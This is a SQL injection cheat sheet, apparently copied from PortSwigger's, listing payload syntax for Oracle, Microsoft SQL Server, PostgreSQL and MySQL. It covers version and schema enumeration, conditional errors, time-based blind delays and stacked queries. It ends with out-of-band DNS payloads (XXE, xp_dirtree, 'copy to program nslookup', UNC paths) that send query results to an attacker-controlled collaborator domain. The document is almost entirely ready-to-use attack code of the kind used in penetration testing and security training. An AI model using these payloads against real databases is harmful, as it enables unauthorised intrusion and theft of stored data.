
### String Concatenation
```
Oracle
'foo'||'bar'

Microsoft
'foo'+'bar'

PostgreSQL
'foo'||'bar'

MySQL
'foo' 'bar' (note the space between the two strings)  
CONCAT('foo','bar')
```

### Substring
```
Oracle
SUBSTR('foobar', 4, 2)

Microsoft
SUBSTRING('foobar', 4, 2)

PostgreSQL
SUBSTRING('foobar', 4, 2)

MySQL
SUBSTRING('foobar', 4, 2)
```

### Comments
```
Oracle
--comment  

Microsoft
--comment  
/*comment*/

PostgreSQL
--comment  
/*comment*/

MySQL
#comment  
-- comment \[Note the space after the double dash\]  
/*comment*/
```

### Database version
```
Oracle
SELECT banner FROM v$version  
SELECT version FROM v$instance  

Microsoft
SELECT @@version

PostgreSQL
SELECT version()

MySQL
SELECT @@version
```

### Database Contents
```
Oracle
SELECT * FROM all_tables  
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'

Microsoft
SELECT * FROM information_schema.tables  
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'  


PostgreSQL
SELECT * FROM information_schema.tables  
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'  


MySQL
SELECT * FROM information_schema.tables  
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

### Conditional Errors
```
Oracle
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual

Microsoft
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END

PostgreSQL
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END

MySQL
SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
```

### Batched or stacked queries
```
Oracle
Does not support batched queries.

Microsoft
QUERY-1-HERE; QUERY-2-HERE

PostgreSQL
QUERY-1-HERE; QUERY-2-HERE

MySQL
QUERY-1-HERE; QUERY-2-HERE
```

### Time delays
```
Oracle
dbms_pipe.receive_message(('a'),10)

Microsoft
WAITFOR DELAY '0:0:10'

PostgreSQL
SELECT pg_sleep(10)

MySQL
SELECT sleep(10)
```

### Conditional Delays
```
Oracle
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual

Microsoft
IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'

PostgreSQL
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END

MySQL
SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')
```

### DNS Lookup
```
Oracle
The following technique leverages an XML external entity ([XXE](https://portswigger.net/web-security/xxe)) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:  
SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual  
  
The following technique works on fully patched Oracle installations, but requires elevated privileges:  
SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')

Microsoft
exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'

PostgreSQL
copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'

MySQL
The following techniques work on Windows only:  
`LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')  
`SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'
```

### DNS lookup with data exfil
```
Oracle
SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual

Microsoft
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"')

PostgreSQL
create OR replace function f() returns void as $$  
declare c text;  
declare p text;  
begin  
SELECT into p (SELECT YOUR-QUERY-HERE);  
c := 'copy (SELECT '''') to program ''nslookup '||p||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';  
execute c;  
END;  
$$ language plpgsql security definer;  
SELECT f();

MySQL
The following technique works on Windows only:  
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'
```




Pulled from PortSwigger SQLi Cheatsheet
https://portswigger.net/web-security/sql-injection/cheat-sheet
